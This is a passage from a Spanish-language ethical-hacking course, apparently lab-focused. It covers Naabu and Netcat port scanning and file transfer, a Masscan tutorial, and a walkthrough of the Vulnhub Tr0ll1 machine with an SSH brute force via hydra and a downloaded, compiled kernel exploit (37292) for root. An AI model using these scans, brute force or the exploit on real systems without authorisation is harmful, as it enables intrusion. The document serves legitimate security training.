- Tu m√°quina atacante (Kali o Ubuntu): `192.168.56.101`
- Tres m√°quinas objetivo de laboratorio (Linux/Windows apps): `192.168.56.110`, `192.168.56.120`, `192.168.56.130`
- Ya instalaste Naabu y Netcat / Ncat (ver secciones anteriores). Naabu requiere libpcap y permisos altos para SYN escaneos confiables. ([GitHub][1], [docs.projectdiscovery.io][6])

---

#### Crear lista de hosts

`hosts.txt`:

```
192.168.56.110
192.168.56.120
192.168.56.130
```

---

#### Escaneo r√°pido ‚Äútop 1000‚Äù con Naabu

```bash
sudo naabu -list hosts.txt -top-ports 1000 -rate 500 -o puertos.txt
```

- `-top-ports 1000` usa la lista popular de puertos (basada en Nmap). ([GitHub][1])
- Reduce `-rate` para redes locales (recomendaci√≥n de los desarrolladores al no usar VPS). ([docs.projectdiscovery.io][6])

Salida t√≠pica (`puertos.txt`):

```
192.168.56.110:22
192.168.56.110:80
192.168.56.120:445
192.168.56.130:21
192.168.56.130:8080
```

---

#### (Opcional pero recomendable) Escaneo profundo autom√°tico con Nmap

Usa integraci√≥n Naabu ‚Üí Nmap:

```bash
cat hosts.txt | naabu -top-ports 1000 -nmap-cli 'nmap -sV -O -Pn'
```

Naabu detecta puertos abiertos, construye la lista y ejecuta Nmap con el comando indicado (`-sV` versi√≥n de servicios, `-O` detecci√≥n de SO). ([docs.projectdiscovery.io][6], [GitHub][1])

---

#### Validaci√≥n manual con Netcat / Ncat

#### Ver banner HTTP en `192.168.56.110:80`

```bash
printf "HEAD / HTTP/1.0\r\n\r\n" | nc -v 192.168.56.110 80
```

El man page de nc muestra c√≥mo ‚Äúhablar‚Äù manualmente con servicios (ej. HTTP) para ver cabeceras y banners. ([man.openbsd.org][4])

#### Probar rango SMTP/SSH r√°pido (suponiendo puertos 22 y 25)

```bash
nc -zv 192.168.56.130 20-30
```

La opci√≥n `-z` reporta qu√© puertos aceptaron conexi√≥n en el rango dado (ejemplo documentado). ([man.openbsd.org][4])

#### Conexi√≥n cifrada con Ncat (si el servicio usa TLS)

```bash
ncat --ssl 192.168.56.120 443
```

Ncat soporta TLS/SSL y funciona igual en Windows/Linux/Mac, ideal para depurar servicios HTTPS o sockets cifrados. ([nmap.org][3])

---

#### Transferir un archivo de prueba (comprobando conectividad)

En **host destino** (por ejemplo 192.168.56.110) escucha y guarda lo recibido:

```bash
nc -l -p 9000 > recibido.txt
```

En tu m√°quina atacante:

```bash
nc 192.168.56.110 9000 < notas.txt
```

El manual de nc incluye este patr√≥n de transferencia de archivos usando redirecci√≥n est√°ndar entre un listener (`-l`) y un cliente. ([man.openbsd.org][4])

---

### Buenas pr√°cticas

- Empieza con tasas bajas en Naabu si trabajas desde tu laptop dom√©stica; incrementa gradualmente. Los autores recomiendan ajustar `-rate` fuera de entornos VPS. ([docs.projectdiscovery.io][6])
- Usa JSON en Naabu para automatizar pipelines y reducir errores de parseo. ([GitHub][1])
- Usa Netcat/Ncat para verificar manualmente antes de lanzar pruebas intrusivas: el man page enfatiza su utilidad en _network daemon testing_ y depuraci√≥n directa de servicios. ([man.openbsd.org][4], [nmap.org][3])
- Si necesitas soporte moderno (TLS, proxies, IPv6 consistente en Windows), usa **Ncat** del proyecto Nmap. ([nmap.org][3])

---

### Fuentes consultadas

(Orden alfab√©tico por herramienta)

- **Naabu Docs ‚Äì Installing Naabu** (Go install, binarios, PATH). ([docs.projectdiscovery.io][5])
- **Naabu Docs ‚Äì Usage & flags, recomendaciones de tasa/uso responsable.** ([docs.projectdiscovery.io][6])
- **Naabu GitHub README ‚Äì caracter√≠sticas, libpcap, ejemplos `-p`, `-top-ports`, integraci√≥n Nmap.** ([GitHub][1])
- **Ncat (Nmap Project) ‚Äì Netcat moderno con TLS, proxy, IPv4/IPv6, binarios multiplataforma.** ([nmap.org][3])
- **OpenBSD nc(1) man page ‚Äì usos: conexiones TCP/UDP, escaneo `-z`, banners, transferencia de archivos, pruebas manuales.** ([man.openbsd.org][4])
- **Ask Ubuntu ‚Äì diferencias netcat-openbsd vs netcat-traditional (IPv6/proxy/sockets vs `-e` cl√°sico; selecci√≥n con update-alternatives).** ([Ask Ubuntu][7])

[1]: https://github.com/projectdiscovery/naabu "GitHub - projectdiscovery/naabu: A fast port scanner written in go with a focus on reliability and simplicity. Designed to be used in combination with other tools for attack surface discovery in bug bounties and pentests"
[2]: https://docs.projectdiscovery.io/tools/naabu/overview "Naabu Overview - ProjectDiscovery Documentation"
[3]: https://nmap.org/ncat/ "Ncat - Netcat for the 21st Century"
[4]: https://man.openbsd.org/nc "nc(1) - OpenBSD manual pages"
[5]: https://docs.projectdiscovery.io/tools/naabu/install "Installing Naabu - ProjectDiscovery Documentation"
[6]: https://docs.projectdiscovery.io/tools/naabu/usage "Naabu Usage - ProjectDiscovery Documentation"
[7]: https://askubuntu.com/questions/346869/what-are-the-differences-between-netcat-traditional-and-netcat-openbsd "What are the differences between netcat-traditional and netcat-openbsd? - Ask Ubuntu"

---

[üîº](#√≠ndice)

---

## **281. Escaneo de puertos ultrarr√°pido: Masscan**

### üß† ¬øQu√© es Masscan?

**Masscan** es una herramienta de c√≥digo abierto para **escaneo de puertos TCP**, conocida por ser **extremadamente r√°pida**. De hecho, puede escanear **la totalidad del Internet IPv4 en menos de 6 minutos** (s√≠, 0.0.0.0 a 255.255.255.255).

#### üî• Caracter√≠sticas clave:

- Es m√°s r√°pido que Nmap.
- Solo detecta **puertos abiertos** (no identifica servicios ni sistemas operativos).
- Se enfoca en **volumen y velocidad**, no en detalle.
- Muy √∫til para auditor√≠as masivas, CTFs, y pentesting de red.

---

### üì¶ Instalaci√≥n de Masscan

#### üîπ En Kali Linux, Ubuntu o Debian:

```bash
sudo apt update
sudo apt install masscan -y
```

#### üîπ En Arch/Manjaro:

```bash
sudo pacman -S masscan
```

#### üîπ En macOS (con Homebrew):

```bash
brew install masscan
```

#### üîπ En Windows:

1. Ve a la p√°gina oficial: [https://github.com/robertdavidgraham/masscan](https://github.com/robertdavidgraham/masscan)
2. Descarga el ejecutable precompilado (o comp√≠lalo con MinGW).
3. Abre la consola `cmd` o PowerShell como administrador y usa el binario.

---

### ‚öôÔ∏è Uso b√°sico de Masscan

#### üîπ Sintaxis general:

```bash
sudo masscan -p <puertos> <objetivo> --rate <velocidad>
```

- `-p <puertos>`: define los puertos a escanear (ej. 80 o 1-65535)
- `<objetivo>`: IP o rango
- `--rate`: paquetes por segundo (ej. 1000, 10000, 100000)

> ‚ö†Ô∏è Masscan puede saturar tu red. Usa velocidades m√°s bajas si est√°s en una red dom√©stica.

---

### üî¨ Ejemplos simples

#### üîπ 1. Escanear el puerto 80 en una IP

```bash
sudo masscan -p80 192.168.1.10 --rate=1000
```

üëâ Escanea solo el puerto 80 (HTTP) a una velocidad moderada.

---

#### üîπ 2. Escanear m√∫ltiples puertos

```bash
sudo masscan -p80,443,22 192.168.1.10 --rate=1000
```

Escanea puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).

---

#### üîπ 3. Escanear todos los puertos

```bash
sudo masscan -p1-65535 192.168.1.10 --rate=5000
```

Escaneo completo de puertos TCP. ‚ö†Ô∏è Puede tardar seg√∫n la red y la velocidad.

---

#### üîπ 4. Escaneo a una red entera

```bash
sudo masscan -p80 192.168.1.0/24 --rate=500
```

Escanea el puerto 80 de toda la subred local (192.168.1.x).

---

#### üîπ 5. Guardar resultados en un archivo

```bash
sudo masscan -p80 192.168.1.0/24 --rate=500 -oG resultado.txt
```

Guarda el resultado en formato greppable.

---

### ‚úÖ Ejemplo completo y explicado

#### üéØ Escenario

Est√°s en una red local y quieres:

- Escanear **todos los puertos** TCP
- En toda una subred
- Guardar los resultados
- Usar una velocidad segura para red dom√©stica

---

#### üîß Comando final:

```bash
sudo masscan -p1-65535 192.168.0.0/24 --rate=1000 -oG escaneo_completo.txt
```

#### üîç Explicaci√≥n de cada parte:

| Parte            | Funci√≥n                                              |
| ---------------- | ---------------------------------------------------- |
| `-p1-65535`      | Escanea todos los puertos TCP                        |
| `192.168.0.0/24` | Apunta a toda la red local                           |
| `--rate=1000`    | Usa una velocidad segura para redes dom√©sticas       |
| `-oG`            | Guarda los resultados en formato legible por humanos |

---

#### üìÑ Resultado esperado (simplificado):

```txt
# Masscan 1.3.2 scan initiated ...
Host: 192.168.0.12 ()    Ports: 22/open/tcp//ssh///
Host: 192.168.0.15 ()    Ports: 80/open/tcp//http///
Host: 192.168.0.21 ()    Ports: 445/open/tcp//microsoft-ds///
```

Ahora puedes tomar estas IPs y usar Nmap para an√°lisis m√°s detallado:

```bash
nmap -A 192.168.0.12
```

---

### üõ†Ô∏è Personaliza m√°s a√∫n (avanzado)

- **Limitar la interfaz de red**:

  ```bash
  --interface eth0
  ```

- **Especificar IP origen (spoofing)**:

  ```bash
  --source-ip 192.168.0.100
  ```

- **Modo silencioso (menos consola)**:

  ```bash
  --output-format binary
  ```

---

### ‚ö†Ô∏è Advertencias y uso √©tico

- **No escanees redes p√∫blicas sin permiso**. Podr√≠as generar alertas, ser bloqueado o incluso enfrentar consecuencias legales.
- Usa Masscan **en entornos controlados**, laboratorios, m√°quinas propias o con autorizaci√≥n expl√≠cita.

---

### üß† Resumen r√°pido

| Objetivo                   | Comando                                   |
| -------------------------- | ----------------------------------------- |
| Escanear puerto 80         | `masscan -p80 IP --rate=1000`             |
| Escanear todos los puertos | `masscan -p1-65535 IP --rate=5000`        |
| Escaneo a red local        | `masscan -p22 192.168.1.0/24 --rate=1000` |
| Guardar resultados         | `masscan ... -oG archivo.txt`             |

---

[üîº](#√≠ndice)

---

## **282. Resoluci√≥n de la m√°quina Tr0ll1**

### üîç 1. üß≠ Descubrimiento de IP

Configura tu red virtual en Modo _Bridged_ o _Host-only_. Luego, en Kali:

```bash
netdiscover -r 192.168.56.0/24
```

Resultar√° una IP nueva, por ejemplo `192.168.56.115` o similar. Esa ser√° la v√≠ctima **Tr0ll‚ÄØ1**. ([Mohamed Ezzat][1], [Medium][2])

---

### üõ†Ô∏è 2. Escaneo con Nmap

Ejecuta un escaneo completo:

```bash
nmap -sC -sV -p- 192.168.56.115
```

Esto revela:

- **FTP (21)** con login **anonymous**
- **SSH (22)**
- **HTTP (80)** con Apache
- Un `/robots.txt` que se√±ala a `/secret` ([InfoSec Write-ups][3], [Medium][2])

---

### üìÇ 3. FTP + PCAP oculta pistas

Accede por FTP:

```bash
ftp 192.168.56.115
# usuario: anonymous
# descarga:
get lol.pcap
```

Abre `lol.pcap` en Wireshark o con TCPDump; encuentras una referencia a un archivo `secret_stuff.txt` que menciona el directorio `sup3rs3cr3tdirlol`. ([Mohamed Ezzat][1])

---

### üß™ 4. Navegaci√≥n web y descubrimiento con divsi√≥n de rutas

- Visita `http://<IP>/secret` ‚Üí ‚Äútrolled‚Äù (sin contenido real).
- Luego `http://<IP>/sup3rs3cr3tdirlol` ‚Üí encuentras el archivo `roflmao`, descargable. ([Infosec Institute][4])

---

### üîç 5. An√°lisis de `roflmao`

```bash
file roflmao
strings roflmao
```

Encuentras la l√≠nea: **"Find address 0x0856BF to proceed"**. Probando esa ruta:

```
http://<IP>/0x0856BF/
```

Se muestran dos carpetas:

- **good_luck/** ‚Üí contiene `which_one_lol.txt` (lista de posibles usuarios).
- **this_folder_contains_the_password/** ‚Üí contiene `Pass.txt`. ([Mohamed Ezzat][1])

Finalmente notas que **nombre del archivo (`Pass.txt`) es la contrase√±a**, no su contenido.&#x20;

---

### ü§ñ 6. Brute force SSH

Con `which_one_lol.txt` como usuarios y `Pass.txt` como contrase√±a real:

```bash
hydra -L which_one_lol.txt -p Pass.txt ssh://192.168.56.115
```

Resultado: se identifica que el usuario **overflow** con contrase√±a **Pass.txt** es v√°lido. ([InfoSec Write-ups][3])

Con√©ctate por SSH y obtienes shell de usuario.

---

### üß± 7. Escalada a root

Dentro del shell:

```bash
uname -a
```

Indica kernel vulnerable (e.g., 3.13.0). Usando `searchsploit` encontraste el exploit ID **37292** (CVE relacionado). Lo copias a la VM, compilas y ejecutas:

```bash
gcc 37292.c -o exploit
./exploit
id
```

Con √©xito, ya est√°s como **root**. ([InfoSec Write-ups][3])

---

### üéâ 8. Flag de root

Como root:

```bash
cd /root
cat proof.txt
```

Obtienes la flag, por ejemplo `702a8c18d29c6f3ca0d99ef5712bfbdc`, completando el boot2root. ([InfoSec Write-ups][3])

---

### üß≠ Resumen del flujo

1. Netdiscover ‚Üí IP objetivo
2. Nmap ‚Üí FTP y HTTP `/secret`
3. FTP ‚Üí descargas `lol.pcap`
4. Wireshark/tcpdump ‚Üí ruta web oculta
5. Web ‚Üí descarga `roflmao`, identifica ruta 0x0856BF
6. Web en 0x0856BF ‚Üí obtienes listas de usuarios/contrase√±a
7. Hydra ‚Üí credenciales SSH
8. SSH ‚Üí shell como overflow
9. searchsploit ‚Üí exploit 37292
10. gcc + exploit ‚Üí root
11. `cat /root/proof.txt` ‚Üí flag

---

### ‚úÖ Ejemplo de comandos clave

```bash
# FTP
ftp 192.168.56.115
get lol.pcap

# An√°lisis de pcap
sudo apt install wireshark
wireshark lol.pcap

# Strings en roflmao
file roflmao
strings roflmao

# Hydra SSH
hydra -L which_one_lol.txt -p Pass.txt ssh://192.168.56.115

# Escalada a root
searchsploit linux kernel 3.13.0 privilege
searchsploit -m 37292
wget http://‚Ä¶/37292.c
gcc 37292.c -o exploit
./exploit

# Flag
sudo cat /root/proof.txt
```

---

### üìå Consejos y aprendizajes

- Interacci√≥n entre varias t√©cnicas: FTP, HTTP, pcap, Strings, SSH brute force, exploit local.
- No siempre la contrase√±a est√° embebida: aqu√≠ **el nombre del archivo**.
- Validaci√≥n manual (strings + test de ruta HTTP) fue m√°s efectiva que ingenier√≠a inversa binaria.
- Tiene trolls intencionales: `robots.txt` sin contenido real, p√°ginas HTML vac√≠as, cron jobs que eliminan tu sesi√≥n‚Ä¶ ¬°no te frustres! ([Infosec Institute][4], [Medium][2], [Mohamed Ezzat][1], [InfoSec Write-ups][3])

---

[1]: https://mohamedaezzat.github.io/posts/troll1/?utm_source=chatgpt.com "Tr0ll 1 Vulnhub Walkthrough - Mohamed Ezzat"
[2]: https://medium.com/%40hackermentor/vulnhub-troll-1-walkthrough-39b655bc70f2?utm_source=chatgpt.com "Vulnhub: Troll 1 ‚Äî Walkthrough - Medium"
[3]: https://infosecwriteups.com/vulnhub-tr0ll-1-writeup-oscp-prep-by-dollarboysushil-657cf3453ba2?utm_source=chatgpt.com "Vulnhub: Tr0ll 1 Writeup (OSCP PREP) [by dollarboysushil]"
[4]: https://www.infosecinstitute.com/resources/penetration-testing/vulnhub-machines-walkthrough-series-tr0ll-1/?utm_source=chatgpt.com "Vulnhub machines walkthrough series ‚Äî Tr0ll: 1 - Infosec"

---

[üîº](#√≠ndice)

---

| **Inicio**         | **Siguiente 2**                                           |
| ------------------ | --------------------------------------------------------- |
| [üè†](../README.md) | [‚è©](./5_2_Hacking_Etico_en_Entornos_Active_Directory.md) |
